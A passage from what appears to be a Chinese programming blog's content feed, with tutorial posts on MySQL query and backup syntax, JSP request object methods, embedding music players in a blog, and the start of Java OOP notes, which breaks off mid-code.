not in(值1,值2);   </p><p>//不是in中指定值的数据</p><h5 id="NULL值查询-注意：列中值为null不能使用-去查询"><a href="#NULL值查询-注意：列中值为null不能使用-去查询" class="headerlink" title="NULL值查询( 注意：列中值为null不能使用=去查询 )"></a>NULL值查询( 注意：列中值为null不能使用=去查询 )</h5><pre><code class="mysql">where 列 is null;  </code></pre><p>//查询列中值为null的数据</p><h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><h5 id="：表示0到多个字符，示例："><a href="#：表示0到多个字符，示例：" class="headerlink" title="%：表示0到多个字符，示例："></a>%：表示0到多个字符，示例：</h5><pre><code class="mysql">where 列 like &#39;%0&#39;;  </code></pre><p> //表示以0结尾where 列 like  ‘0%’;   </p><p>//表示以0开头where 列 like  ‘%0%’;  </p><p> //表示数据中包含0</p><h5 id="：表示一个字符，可多次使用，示例："><a href="#：表示一个字符，可多次使用，示例：" class="headerlink" title="_：表示一个字符，可多次使用，示例："></a>_：表示一个字符，可多次使用，示例：</h5><pre><code class="mysql">where 列 like &#39;%0_&#39;;   </code></pre><p>//数据结尾第二位是0</p><h5 id="结果排序-对查询出的结果按照一列或多列进行升序还是降序排列-升序-asc-降序-desc-注意：不能使用中文的别名排序"><a href="#结果排序-对查询出的结果按照一列或多列进行升序还是降序排列-升序-asc-降序-desc-注意：不能使用中文的别名排序" class="headerlink" title="结果排序( 对查询出的结果按照一列或多列进行升序还是降序排列 升序:asc  降序:desc    注意：不能使用中文的别名排序)"></a>结果排序( 对查询出的结果按照一列或多列进行升序还是降序排列 升序:asc  降序:desc    注意：不能使用中文的别名排序)</h5><pre><code class="mysql">where 条件 order by 列 [asc/desc]</code></pre><p>语句的执行顺序：from—&gt;where—&gt;select—&gt;order by</p><h5 id="分页查询-beginIndex-表示从第多少条数据开始-pageSize-表示每页显示的数据条数"><a href="#分页查询-beginIndex-表示从第多少条数据开始-pageSize-表示每页显示的数据条数" class="headerlink" title="分页查询( beginIndex:表示从第多少条数据开始   pageSize:表示每页显示的数据条数 )"></a>分页查询( beginIndex:表示从第多少条数据开始   pageSize:表示每页显示的数据条数 )</h5><pre><code class="mysql">where [条件] limit beginIndex,pageSize;</code></pre><p>ex：每页显示3条数据<br>第一页: SELECT * FROM 表名 LIMIT 0,3    –0,1,2<br>第二页: SELECT * FROM 表名 LIMIT 3,3    –3,4,5<br>第三页: SELECT * FROM 表名 LIMIT 6,3    –6,7,8<br>第四页: SELECT * FROM 表名 LIMIT 9,3    –9,10,11<br>  ……<br>第七页: SELECT * FROM 表名 LIMIT 18,3   –18,19,20</p><h5 id="beginIndex公式：-当前页数-1-pageSize"><a href="#beginIndex公式：-当前页数-1-pageSize" class="headerlink" title="beginIndex公式：(当前页数-1)*pageSize"></a>beginIndex公式：(当前页数-1)*pageSize</h5><h5 id="聚集函数-作用于一组数据，并对一组数据返回一个值"><a href="#聚集函数-作用于一组数据，并对一组数据返回一个值" class="headerlink" title="聚集函数( 作用于一组数据，并对一组数据返回一个值 )"></a>聚集函数( 作用于一组数据，并对一组数据返回一个值 )</h5><h5 id="COUNT-统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值"><a href="#COUNT-统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值" class="headerlink" title="COUNT:统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值"></a>COUNT:统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值</h5><h5 id="MAX-统计计算最大值"><a href="#MAX-统计计算最大值" class="headerlink" title="MAX:  统计计算最大值"></a>MAX:  统计计算最大值</h5><h5 id="MIN-统计计算最小值"><a href="#MIN-统计计算最小值" class="headerlink" title="MIN:  统计计算最小值"></a>MIN:  统计计算最小值</h5><h5 id="SUM-统计计算求和"><a href="#SUM-统计计算求和" class="headerlink" title="SUM:  统计计算求和"></a>SUM:  统计计算求和</h5><h5 id="AVG-统计计算平均值"><a href="#AVG-统计计算平均值" class="headerlink" title="AVG:  统计计算平均值"></a>AVG:  统计计算平均值</h5><h5 id="分组函数-注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后"><a href="#分组函数-注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后" class="headerlink" title="分组函数( 注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后 )"></a>分组函数( 注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后 )</h5><pre><code class="mysql">select 聚集函数 from 表名 where [条件] group by 列 having 分组后的条件</code></pre><p>语句的执行顺序：FROM—&gt; WHERE—&gt;group by—-&gt;Having—&gt;SELECT–&gt;ORDER BY</p><h5 id="Where和having的区别："><a href="#Where和having的区别：" class="headerlink" title="Where和having的区别："></a>Where和having的区别：</h5><h5 id="Where-先过滤已有的数据-数据是已经存在的-在进行分组-在聚集计算"><a href="#Where-先过滤已有的数据-数据是已经存在的-在进行分组-在聚集计算" class="headerlink" title="Where: 先过滤已有的数据(数据是已经存在的),在进行分组,在聚集计算"></a>Where: 先过滤已有的数据(数据是已经存在的),在进行分组,在聚集计算</h5><h5 id="Having-先分组-在对每组进行计算-根据得到结果在过滤-分组把数据算出之后，在过滤"><a href="#Having-先分组-在对每组进行计算-根据得到结果在过滤-分组把数据算出之后，在过滤" class="headerlink" title="Having:先分组,在对每组进行计算,根据得到结果在过滤(分组把数据算出之后，在过滤)"></a>Having:先分组,在对每组进行计算,根据得到结果在过滤(分组把数据算出之后，在过滤)</h5><p>注意：使用having的时候，它是可以使用别名的</p><h5 id="数据查询-多表"><a href="#数据查询-多表" class="headerlink" title="===============================数据查询-多表==============================="></a>===============================数据查询-多表===============================</h5><h5 id="交叉连接-又名笛卡尔积，使用交叉连接会产生笛卡尔积"><a href="#交叉连接-又名笛卡尔积，使用交叉连接会产生笛卡尔积" class="headerlink" title="交叉连接:又名笛卡尔积，使用交叉连接会产生笛卡尔积"></a>交叉连接:又名笛卡尔积，使用交叉连接会产生笛卡尔积</h5><p>假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p><pre><code class="mysql">select *  from 表1,表2</code></pre><h5 id="内连接：过滤为空的数据-查询的实际上是两张表数据的交集部分-目的-》解决笛卡尔积现象，正确查询了需要的数据"><a href="#内连接：过滤为空的数据-查询的实际上是两张表数据的交集部分-目的-》解决笛卡尔积现象，正确查询了需要的数据" class="headerlink" title="内连接：过滤为空的数据(查询的实际上是两张表数据的交集部分)    目的 ==》解决笛卡尔积现象，正确查询了需要的数据"></a>内连接：过滤为空的数据(查询的实际上是两张表数据的交集部分)    目的 ==》解决笛卡尔积现象，正确查询了需要的数据</h5><pre><code class="mysql">select * from 表1,表2  where 表1.字段=表2.字段;  </code></pre><p>//隐式内连接,使用where条件消除笛卡尔积</p><pre><code class="mysql">select * from 表1 [inner] join 表2 on 表1.字段=表2.字段;</code></pre><p> //显式内连接,如果是多张表，则一直在join..on后依次添加join..on即可,inner关键字可被省略</p><h5 id="外连接：左外连接、右外连接、全外连接"><a href="#外连接：左外连接、右外连接、全外连接" class="headerlink" title="外连接：左外连接、右外连接、全外连接"></a>外连接：左外连接、右外连接、全外连接</h5><h5 id="左外连接-以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解"><a href="#左外连接-以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解" class="headerlink" title="左外连接:以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解"></a>左外连接:以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解</h5><pre><code class="mysql">select * from 表1 left [outer] join 表2 on 表1.字段=表2.字段;   </code></pre><p>//表1为左表，表2为右表,outer关键字可被省略</p><h5 id="右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解"><a href="#右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解" class="headerlink" title="右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解"></a>右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解</h5><pre><code class="mysql">select * from 表1 right [outer] join 表2 on 表1.字段=表2.字段;  </code></pre><p>//表1为左表，表2为右表,outer关键字可被省略</p><h5 id="全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名"><a href="#全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名" class="headerlink" title="全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名"></a>全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名</h5><p>多用在分类数据、省市县分类数据、权限…</p><pre><code class="mysql">select 表1.字段1,表2.字段2 from 表名 as 表1,表名 as 表2 where 表1.字段1=表2.字段2 </code></pre><h5 id="子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套"><a href="#子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套" class="headerlink" title="子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套"></a>子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套</h5><pre><code class="mysql">select * from (select * from 表名) as 别名select * from where 条件</code></pre><p>//条件中包含查询语句</p><p>注意：1.查询结果的虚拟表必须取别名<br>           2.字段与关键字一样，冲突时，需要给字段名加``,(Esc键下面、1的左边)<br>           3.如果给虚拟结果表中的字段取了别名，则对虚拟结果表查询时，应该用 表别名.虚拟表字段别名</p><h5 id="插入数据"><a href="#插入数据" class="headerlink" title="===============================插入数据==============================="></a>===============================插入数据===============================</h5><pre><code class="mysql">insert into 表名(字段1,字段2..) values(值1,值2…);   </code></pre><p>注意： 1.如果插入的表中的主键是自增类型的，可以不用插入值<br>            2.如果主键是非自增 ，插入的数据则是填补主键字段值空余的值<br>            3.如果主键设置了自动递增，会从主键字段最大值开始插入数据</p><h5 id="其他插入方式："><a href="#其他插入方式：" class="headerlink" title="其他插入方式："></a>其他插入方式：</h5><pre><code class="mysql">insert into 表名(字段1,字段2) values(值1,值2),(值1,值2);    </code></pre><p>//插入多条数据【MYSQL】insert into 表名 values(值1,值2);                    </p><p>//针对全表所有字段进行插入操作insert into 表名(字段) select 字段 from 表2;         </p><p>//查询结果插入insert into 表名 select 字段 from 表2;               </p><p>//查询结果，全表插入</p><h5 id="修改数据"><a href="#修改数据" class="headerlink" title="===============================修改数据==============================="></a>===============================修改数据===============================</h5><pre><code class="mysql">update 表 set 字段=值 where 条件; </code></pre><p> //带条件修改指定数据，否则修改全表</p><h5 id="删除数据"><a href="#删除数据" class="headerlink" title="===============================删除数据==============================="></a>===============================删除数据===============================</h5><pre><code class="mysql">delete from 表 where 条件; </code></pre><p>//删除数据带条件指定数据，否则删除全表数据</p><h5 id="数据备份"><a href="#数据备份" class="headerlink" title="===============================数据备份==============================="></a>===============================数据备份===============================</h5><h5 id="在命令行窗口进行，若操作系统版本高，则使用管理员模式"><a href="#在命令行窗口进行，若操作系统版本高，则使用管理员模式" class="headerlink" title="在命令行窗口进行，若操作系统版本高，则使用管理员模式"></a>在命令行窗口进行，若操作系统版本高，则使用管理员模式</h5><p>导出：</p><p>mysqldump -u账户 -p密码 数据库名称&gt;脚本文件存储地</p><p>ex:         mysqldump -uroot -proot jdbcdemo&gt; C:/shop_bak.sql<br>导入：</p><p>mysql -u账户 -p密码 数据库名称&lt; 脚本文件存储地址</p><p>ex:         mysql -uroot -proot jdbcdemo&lt; C:/shop_bak.sql<br>使用可视化导入导出：<br>Navicat工具的导入和导出/Navicat工具的备份和还原</p><h5 id="数据索引"><a href="#数据索引" class="headerlink" title="===============================数据索引==============================="></a>===============================数据索引===============================</h5><h5 id="索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。"><a href="#索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。" class="headerlink" title="索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。"></a>索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。</h5><h5 id="什么列适合建索引？？"><a href="#什么列适合建索引？？" class="headerlink" title="什么列适合建索引？？"></a>什么列适合建索引？？</h5><p>1.表的主键、外键必须有索引；<br>2.数据量超过30000的表应该有索引；<br>3.经常与其他表进行连接的表，在连接字段上应该建立索引；<br>4.经常出现在Where子句中的字段，特别是大表的字段，应该建立索引；<br>5.索引应该建在选择性高的字段上；<br>6.索引应该建在小字段上，对于大的文本字段甚至超长字段，不要建索引； </p><h5 id="sql语句创建和删除索引："><a href="#sql语句创建和删除索引：" class="headerlink" title="sql语句创建和删除索引："></a>sql语句创建和删除索引：</h5><p>创建索引: </p><p>CREATE INDEX 索引名称 ON 表名 (列名)</p><p>删除索引:<br>方式一：</p><p>DROP INDEX 索引名 ON 表名 </p><p>方式二:  </p><p>ALTER TABLE 表名 DROP INDEX 索引名</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jsp的request对象</title>
    <link href="undefined2019/11/23/jsp%E7%9A%84request%E5%AF%B9%E8%B1%A1/"/>
    <url>2019/11/23/jsp%E7%9A%84request%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="jsp的request对象主要方法"><a href="#jsp的request对象主要方法" class="headerlink" title="jsp的request对象主要方法"></a>jsp的request对象主要方法</h3><h6 id="request对象的方法非常多，只写其中常用的几种方法。"><a href="#request对象的方法非常多，只写其中常用的几种方法。" class="headerlink" title="request对象的方法非常多，只写其中常用的几种方法。"></a>request对象的方法非常多，只写其中常用的几种方法。</h6><ul><li><p><strong>getAttribute(String name);</strong>这个方法可以取出<strong>name</strong>属性的值，<strong>name</strong>属性的值可以用<strong>setAttribute(String name,Object o);</strong>方法赋值，如果没有对其赋值，则默认<strong>name</strong>为<strong>null</strong>;    </p></li><li><p><strong>getContexntPath();</strong>这个方法可以获取服务器上下文的路径；</p></li><li><p><strong>getCookies();</strong>这个方法可以获取客户端的Cookies（一个保存在客户机中的简单的文本文件）；</p></li><li><p><strong>getHeader(String name)</strong>这个方法可以获取指定名称的HTTP报头的属性值；</p></li><li><p><strong>getParameter(String name)</strong>这个方法可以获取客户端提交到服务器的参数；</p></li><li><p><strong>getServerName()</strong>这个方法可以获得服务器的名称</p></li><li><p><strong>getServerPort()</strong>这个方法可以获得服务器的访问端口</p></li><li><p><strong>setAttribute(String name,Object o);</strong>对name属性赋值</p></li><li><p><strong>removeAttribute(String name)</strong>这个方法移除指定名称的属性</p></li><li><p><strong>getRemoteAddr()</strong>这个方法返回客户端的IP地址</p><h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2></li></ul><pre><code class="jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;gb2312&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;request实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    request.setAttribute(&quot;attr&quot;, &quot;hello!&quot;);    out.print(&quot;attr的值&quot;+request.getAttribute(&quot;attr&quot;)+&quot;&lt;br&gt;&quot;);    out.print(&quot;上下文路径&quot;+request.getContextPath()+&quot;&lt;br&gt;&quot;);    out.print(&quot;Cookies:&quot;+request.getCookies()+&quot;&lt;br&gt;&quot;);    out.print(&quot;Host:&quot;+request.getHeader(&quot;Host&quot;)+&quot;&lt;br&gt;&quot;);    out.print(&quot;服务器名称：&quot;+request.getServerName()+&quot;&lt;br&gt;&quot;);    out.print(&quot;服务器端口：&quot;+request.getServerPort()+&quot;&lt;br&gt;&quot;);    out.print(&quot;客户端的IP地址：&quot;+request.getRemoteAddr()+&quot;&lt;br&gt;&quot;);    request.removeAttribute(&quot;attr&quot;);    out.print(&quot;属性移除后的attr的值：&quot;+request.getAttribute(&quot;attr&quot;)+&quot;&lt;br&gt;&quot;);%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><img src="http://a1.qpic.cn/psb?/V13S9xI31Px2LW/p5RYDG8GnkBkSSMOzIUH7uJq0KspJo3TBS*Hf.Iwp9M!/c/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=nwEkAZ8BJAEDGTw!&tl=1&vuin=1458566939&tm=1571918400&sce=60-2-2&rf=0-0" srcset="undefined" style="zoom:150%;" /><ul><li>补充一个<strong>request.setCharacterEncoding(“utf-8”);</strong>用来改变传递参数的编码</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>在博客中添加音乐</title>
    <link href="undefined2019/11/23/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/"/>
    <url>2019/11/23/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<h2 id="1-音乐来源"><a href="#1-音乐来源" class="headerlink" title="1. 音乐来源"></a>1. 音乐来源</h2><p>现在要找个 <code>.mp3</code> 外链资源可真不容易，以往的酷狗歌曲信息里带着，现在也不见了，百度音乐下载也得用客户端，还不显示链接，各大音乐网站真是越来越小心了啊。</p><h3 id="1-1-网易云音乐"><a href="#1-1-网易云音乐" class="headerlink" title="1.1 网易云音乐"></a>1.1 网易云音乐</h3><p>想要从网站获取音乐链接的方法还是有的，比如说 <a href="https://music.163.com/#" target="_blank" rel="noopener">网易云音乐</a> 。使用Google/firefox/edge等带开发者工具的浏览器打开网易云音乐，搜索自己想要的音乐，并进行播放，然后打开开发者工具。开发工具打开方式：</p><ol><li>谷歌：右键点击 <strong>检查</strong>，或使用快捷键 <code>Ctrl+Shift+I</code> ;</li><li>edge：右键点击 <strong>检查元素</strong>/ <strong>查看源</strong>，或使用快捷键 <code>F12</code> ;</li><li>firefox：快捷键 <code>Shift+F2</code> 。</li></ol><p><a href="https://www.litreily.top/assets/music/xishanyao.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/xishanyao.png" srcset="undefined" alt="网易云音乐"></a></p><p>以 <a href="https://music.163.com/#/song?id=405253647" target="_blank" rel="noopener">夕山谣</a> 为例，打开开发工具，找到 <code>Application</code> ，打开 <code>Frames/top/Media</code> 。</p><p><a href="https://www.litreily.top/assets/music/xishanyaoLink.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/xishanyaoLink.png" srcset="undefined" alt="开发工具"></a></p><p>右键选择” Open link in new tab “ 或者 “ Copy link address “，选取链接的前半部分,以 <code>.mp3</code> 结尾。得到链接：</p><pre><code>夕山谣http://m10.music.126.net/20161028204714/808f68e0d3afc7d68d6945d0ce8336eb/ymusic/5a20/163f/3437/9a6871479b12bc82fff53821676faedc.mp3</code></pre><h3 id="1-2-本地上传"><a href="#1-2-本地上传" class="headerlink" title="1.2 本地上传"></a>1.2 本地上传</h3><p>除了上述方法外，也可以手动制作音乐外链，当然，这需要借助于其它网站，比如 <a href="http://www.111ttt.com/up/" target="_blank" rel="noopener">www.111ttt.com/up/</a> 。在该网站上传已经下好的音乐文件，然后点击播放地址，在弹出的页面底部就有已生成的外链地址了。</p><p><a href="https://www.litreily.top/assets/music/upFile.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/upFile.png" srcset="undefined" alt="上传音乐"></a></p><pre><code>Critty 杏花弦外雨http://sc.111ttt.com/up/mp3/193721/278DF18856D56FEC6B4E6EDC15D97906.mp3</code></pre><h3 id="1-3-七牛云存储"><a href="#1-3-七牛云存储" class="headerlink" title="1.3 七牛云存储"></a>1.3 七牛云存储</h3><p><a href="http://www.qiniu.com/" target="_blank" rel="noopener">七牛云</a> 作为国内领先的企业级云服务商，当然提供了最基本的云存储服务。当前可以免费注册并进行实名认证，之后可以获取 10GB 的免费存储空间。</p><p><a href="https://www.litreily.top/assets/music/qiniuyunSpace.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/qiniuyunSpace.png" srcset="undefined" alt="七牛云免费空间"></a></p><p>注册并登录后，需要先创建一个空间，如 <code>litreily</code>，然后打开 <code>对象存储</code> &gt;&gt; <code>litreily</code> &gt;&gt; <code>内容管理</code>。此时便可上传文件，文件类型不限，我们可以将本地音乐文件上传后获取其外链地址。</p><p><a href="https://www.litreily.top/assets/music/qiniuyunLink.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/qiniuyunLink.png" srcset="undefined" alt="七牛云外链获取方法"></a></p><p>所得外链地址为：</p><pre><code>CRITTY - 轮回之境http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3</code></pre><h2 id="2-音乐播放器"><a href="#2-音乐播放器" class="headerlink" title="2. 音乐播放器"></a>2. 音乐播放器</h2><h3 id="2-1-网易云音乐插件"><a href="#2-1-网易云音乐插件" class="headerlink" title="2.1 网易云音乐插件"></a>2.1 网易云音乐插件</h3><p>网易云音乐提供了外链播放器，官方提供的使用方法如下：</p><ol><li>在 <a href="https://music.163.com/" target="_blank" rel="noopener">music.163.com</a> 进入单曲、歌单、专辑、电台节目页面后，点击 “生成外链播放器” 链接。</li><li>歌单和专辑外链播放器可以选择大中小三种尺寸，单曲和电台节目可以选择中小两种尺寸。你可以选择最适合你网站设计的尺寸。</li><li>还可以选择是否要自动播放，打上勾后，别人访问网站时播放器会自动开始播放。</li><li>最后将播放器的代码黏贴到你的网站上，大功告成！</li></ol><p>[示例：杏花轩外雨]</p><p><a href="https://www.litreily.top/assets/music/wlPlayer.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/wlPlayer.png" srcset="undefined" alt="网易云音乐外链播放器"></a></p><p>[示例代码]</p><p><a href="https://www.litreily.top/assets/music/wlDemo.png" target="_blank" rel="noopener"><img src="https://www.litreily.top/assets/music/wlDemo.png" srcset="undefined" alt="网易云音乐外链demo"></a></p><p>[示例说明]</p><ol><li>HTML源码中的 “ auto=1 “ 代表自动播放，改为0即可取消自动播放功能；</li><li>在markdown文件中引用该插件时，需要将 <code>iframe</code> 的 <code>width</code> 和 <code>height</code> 属性值用双引号包围起来，即 width=”330” height=”86” ,否则可能出现无法解析该代码的情况；</li><li>使用插件时可以添加一个类（如：class=”musicPlayer”），参考以下代码可以设置播放器的长宽。</li></ol><pre><code>.musicPlayer{    width: 100%;    max-width: 500px;}</code></pre><p>[示例播放1：height=66 auto=1]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=1&amp;height=66"></iframe><pre><code>&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot;height=&quot;86&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;</code></pre><p>[示例播放2：height=32 auto=0]</p><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32"></iframe><pre><code>&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot;height=&quot;52&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;</code></pre><h3 id="2-2-audio-js"><a href="#2-2-audio-js" class="headerlink" title="2.2 audio.js"></a>2.2 audio.js</h3><p><a href="https://kolber.github.io/audiojs/" target="_blank" rel="noopener">audio.js</a>是一款轻量级的音乐播放器，下载文件后，将文件夹 “audiojs” 放在网站文件目录中，通过以下代码的形式将该播放器引入网页中。</p><pre><code>&lt;head&gt;    ...    &lt;script src=&quot;/audiojs/audio.min.js&quot;&gt;&lt;/script&gt;    &lt;script&gt;      audiojs.events.ready(function() {        audiojs.createAll();      });    &lt;/script&gt;    ...&lt;/head&gt;&lt;body&gt;    ...    &lt;!-- 音乐播放器位置 --&gt;    &lt;!-- preload=&quot;auto&quot; 可以替换为 autoplay 或者 loop  --&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot;    preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;!-- 说明：使用该插件后，其脚本语言将自动为其添加以下内容：        class=&quot;audiojs&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;        如果一个页面中存在多个audiojs播放器，其id尾数将从0逐一增加        通过css修改这些属性，我们可以改变播放器的外观 --&gt;    ...&lt;/body&gt;</code></pre><p>[示例：杏花轩外雨，链接由上述1.2方式而得]</p><p>[示例html源码]</p><pre><code>&lt;div class=&quot;audiojs   playing&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;&gt;    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot; preload=&quot;auto&quot;&gt;&lt;/audio&gt;    &lt;div class=&quot;play-pause&quot;&gt;                     &lt;p class=&quot;play&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;pause&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;loading&quot;&gt;&lt;/p&gt;                     &lt;p class=&quot;error&quot;&gt;&lt;/p&gt;               &lt;/div&gt;               &lt;div class=&quot;scrubber&quot;&gt;        &lt;div class=&quot;progress&quot; style=&quot;width: 167.146px;&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;loaded&quot; style=&quot;width: 280px;&quot;&gt;&lt;/div&gt;    &lt;/div&gt;               &lt;div class=&quot;time&quot;&gt;        &lt;em class=&quot;played&quot;&gt;02:22&lt;/em&gt;/&lt;strong class=&quot;duration&quot;&gt;03:57&lt;/strong&gt;               &lt;/div&gt;      &lt;div class=&quot;error-message&quot;&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="2-3-其它"><a href="#2-3-其它" class="headerlink" title="2.3 其它"></a>2.3 其它</h3><ul><li><a href="http://www.ithome.com/html/it/195970.htm" target="_blank" rel="noopener">7 款高颜值 HTML5 播放器</a></li><li><a href="https://www.oschina.net/news/27466/html5-audio-players" target="_blank" rel="noopener">10 个基于 Web 的 HTML5 音乐播放器</a></li><li><a href="http://www.shejidaren.com/free-audio-players.html" target="_blank" rel="noopener">10 个免费开源的 JS 音乐播放器插件</a></li><li><a href="http://www.17sucai.com/pins/tag/3189.html" target="_blank" rel="noopener">播放器 jquery 特效代码</a></li></ul><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>网易云音乐的播放器插件使用方便，但是连接效率太低，经常获取不到资源或者获取速度过慢，而 audiojs 播放器虽然外观简陋些，但资源下载效率还不错，而且资源地址可以自定义，不会受限。所以，各有利弊，依情况而定吧。</p><blockquote><p>本文作者：cuicuihao</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java_Oop知识点总结</title>
    <link href="undefined2019/10/12/Java-Oop%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <url>2019/10/12/Java-Oop%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<br /><hr><h1 id="Less-is-More"><a href="#Less-is-More" class="headerlink" title="Less is More"></a>Less is More</h1><br /><hr><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-MVC架构设计模式"><a href="#1-MVC架构设计模式" class="headerlink" title="1.MVC架构设计模式"></a>1.MVC架构设计模式</h3><p>M<sub>数据模型层</sub></p><p>V<sub>视图层</sub></p><p>C<sub>控制器层</sub></p><hr><h2 id="第二章-类和对象"><a href="#第二章-类和对象" class="headerlink" title="第二章 类和对象"></a>第二章 类和对象</h2><h3 id="1-面向对象概念："><a href="#1-面向对象概念：" class="headerlink" title="1. 面向对象概念："></a>1. 面向对象概念：</h3><h3 id="2-类的创建"><a href="#2-类的创建" class="headerlink" title="2. 类的创建"></a>2. 类的创建</h3><pre><code class="java">语法：public class 类名{}File---&gt;new---&gt;class---&gt;类名</code></pre><h3 id="3-创建对象"><a href="#3-创建对象" class="headerlink" title="3.创建对象"></a>3.创建对象</h3><pre><code class="java">类名 对象名=new 类名();对象名.方法名(); 对象名.属性</code></pre><h3 id="4-构造方法："><a href="#4-构造方法：" class="headerlink" title="4.构造方法："></a>4.构造方法：</h3><h4 id="方法名和类名相同-没有返回值"><a href="#方法名和类名相同-没有返回值" class="headerlink" title="方法名和类名相同,没有返回值"></a>方法名和类名相同,没有返回值</h4><pre><code class="java">public class 类名{    public 